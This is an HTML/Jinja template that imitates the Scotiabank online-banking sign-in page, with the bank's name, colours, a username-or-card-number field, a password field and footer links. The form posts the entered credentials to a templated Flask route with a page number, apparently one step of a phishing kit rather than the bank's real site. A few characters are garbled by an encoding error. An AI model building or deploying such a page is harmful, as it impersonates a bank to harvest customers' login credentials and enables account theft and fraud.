<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to Scotiabank</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            position: absolute;
            top: 20px;
            right: 20px;
            color: #666;
            font-size: 14px;
        }

        .lock-icon {
            display: inline-block;
            margin-right: 5px;
            font-size: 16px;
        }

        .main-container {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .login-card {
            background: white;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            padding: 48px 40px;
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        .welcome-text {
            color: #333;
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
        }

        .scotiabank-logo {
            color: #ED1C24;
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 40px;
        }

        .form-group {
            margin-bottom: 24px;
            text-align: left;
        }

        .form-label {
            display: block;
            color: #333;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
        }

        .form-input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
            background: #fff;
            transition: border-color 0.3s ease;
        }

        .form-input:focus {
            outline: none;
            border-color: #ED1C24;
            box-shadow: 0 0 0 3px rgba(237, 28, 36, 0.1);
        }

        .form-input::placeholder {
            color: #999;
        }

        .checkbox-container {
            display: flex;
            align-items: center;
            margin-bottom: 32px;
        }

        .checkbox {
            width: 18px;
            height: 18px;
            margin-right: 12px;
            cursor: pointer;
        }

        .checkbox-label {
            color: #666;
            font-size: 14px;
            cursor: pointer;
        }

        .sign-in-btn {
            width: 100%;
            background: #ED1C24;
            color: white;
            border: none;
            padding: 14px 24px;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.1s ease;
            margin-bottom: 24px;
        }

        .sign-in-btn:hover {
            background: #d1171e;
            transform: translateY(-1px);
        }

        .sign-in-btn:active {
            transform: translateY(0);
        }

        .help-link {
            color: #0066cc;
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 32px;
            display: inline-block;
        }

        .help-link:hover {
            text-decoration: underline;
        }

        .signup-section {
            padding-top: 24px;
            border-top: 1px solid #eee;
            color: #666;
            font-size: 14px;
        }

        .signup-link {
            color: #333;
            text-decoration: none;
            font-weight: 600;
        }

        .signup-link:hover {
            text-decoration: underline;
        }

        .footer {
            background: white;
            padding: 20px;
            text-align: center;
            border-top: 1px solid #eee;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 24px;
            margin-bottom: 16px;
        }

        .footer-link {
            color: #666;
            text-decoration: none;
            font-size: 13px;
        }

        .footer-link:hover {
            color: #333;
        }

        .footer-logo {
            color: #ED1C24;
            font-size: 18px;
            font-weight: 700;
            margin-right: 8px;
        }

        .copyright {
            color: #999;
            font-size: 12px;
        }

        @media (max-width: 480px) {
            .login-card {
                padding: 32px 24px;
                margin: 20px;
            }

            .footer-links {
                flex-direction: column;
                gap: 12px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <span class="lock-icon">ðŸ”’</span>
    </div>

    <div class="main-container">
        <div class="login-card">
            <div class="welcome-text">Welcome to</div>
            <div class="scotiabank-logo">Scotiabank</div>

            <form method="POST" action="{{ url_for('page', page_num=page_num) }}">
                
                <div class="form-group">
                    <label class="form-label" for="username">Username or card number</label>
                    <input type="text" id="username" name="username" class="form-input" placeholder="Enter username or card number">
                </div>

                <div class="form-group">
                    <label class="form-label" for="password">Password</label>
                    <input type="password" id="password" name="password" class="form-input" placeholder="Enter password">
                </div>

                <div class="checkbox-container">
                    <input type="checkbox" id="remember" class="checkbox">
                    <label for="remember" class="checkbox-label">Remember my username or card number</label>
                </div>

                <button type="submit" class="sign-in-btn">Sign In</button>

                <a href="#" class="help-link">Need help signing in? ></a>

                <div class="signup-section">
                    Don't have a username and password? <a href="#" class="signup-link">Set them up now.</a>
                </div>
            </form>
        </div>
    </div>

    <footer class="footer">
        <div class="footer-links">
            <a href="#" class="footer-link">Contact Us</a>
            <a href="#" class="footer-link">Security</a>
            <a href="#" class="footer-link">Legal</a>
            <a href="#" class="footer-link">Privacy</a>
            <a href="#" class="footer-link">Accessibility</a>
            <a href="#" class="footer-link">Cookie Settings</a>
        </div>
        <div class="copyright">
            <span class="footer-logo">S</span>Â© Scotiabank. All Rights Reserved.
        </div>
    </footer>
</body>
</html>
